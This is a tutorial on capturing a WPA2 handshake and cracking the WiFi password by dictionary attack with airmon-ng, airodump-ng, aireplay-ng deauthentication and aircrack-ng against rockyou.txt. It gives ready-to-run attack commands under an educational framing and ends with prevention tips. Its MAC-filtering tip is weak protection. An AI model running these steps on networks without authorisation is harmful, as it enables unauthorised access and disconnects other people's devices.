# Brute_Force-Dictionary_Attack_on_WiFi

## WPA2

---

## 1. Introduction

This tutorial demonstrates how to perform a Dictionary Attack on a WiFi network secured with WPA2. The attack is based on capturing the handshake, which occurs when a device connects to the network, and comparing it against a known password dictionary.

> **Note:** This material is provided for educational purposes only. Testing networks without authorization is illegal.

---

## 2. Phase 1: Capturing the Handshake

To proceed, we need to capture the handshake of the target network.

### 2.1 Steps

1. Enable monitor mode on the WiFi card:
   ```bash
   airmon-ng start wlan0
   ```
2. Identify the target network:
   ```bash
   airodump-ng wlan0mon
   ```
   > **Note:** Write down the BSSID of the network and its channel (CH).

3. Create a folder to save the handshake:
   ```bash
   mkdir -p ~/Desktop/handshake
   ```

4. Capture network traffic and save the handshake:
   ```bash
   airodump-ng -c [Channel] --bssid [BSSID] -w ~/Desktop/handshake/handshake wlan0mon
   ```

5. Force a client to disconnect to capture the handshake (optional):
   ```bash
   aireplay-ng -0 10 -a [BSSID] wlan0mon
   ```
   > Once the client reconnects, the handshake will be captured and saved in:
   > `~/Desktop/handshake/handshake.cap`

---

## 3. Phase 2: Dictionary Attack

Now we can compare the captured handshake with a password dictionary.

### 3.1 Using a Default Dictionary

Kali Linux includes some predefined dictionaries. A good starting point is the `rockyou.txt` dictionary, located at:

```bash
/usr/share/wordlists/rockyou.txt.gz
```

Extract it before using:

```bash
gunzip /usr/share/wordlists/rockyou.txt.gz
```

Start the cracking process:

```bash
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b [BSSID] ~/Desktop/handshake/handshake.cap
```

### 3.2 Using Larger Dictionaries

If the password is not found, try using larger dictionaries available on:

- **WeakPass** – A database with massive lists of real passwords.

Download a larger dictionary and use it with the following command:

```bash
aircrack-ng -w [dictionary_path] -b [BSSID] ~/Desktop/handshake/handshake.cap
```

---

## 4. Phase 3: Restoring the WiFi Card

After completing the attack, it is important to restore the WiFi card to its original state.

1. Disable monitor mode:
   ```bash
   airmon-ng stop wlan0mon
   ```

2. Restart network services:
   ```bash
   service networking restart
   service NetworkManager restart
   ```

3. Verify that the card is back to normal mode:
   ```bash
   iwconfig
   ```
   > If the card is back to `wlan0`, the restoration was successful.

---

## 5. Phase 4: Prevention

To protect against this type of attack:

- Use long and complex passwords with numbers and special characters.
- Change the WiFi password periodically.
- Use WPA3 if available.
- Configure MAC address filtering to limit authorized devices.

---

## 6. Conclusion

We have seen how a dictionary attack can be used to discover WiFi passwords by capturing the handshake and using a password dictionary. However, the effectiveness depends on the quality and size of the dictionary.

> **Note:** This tutorial is for educational purposes only. Unauthorized use is illegal.
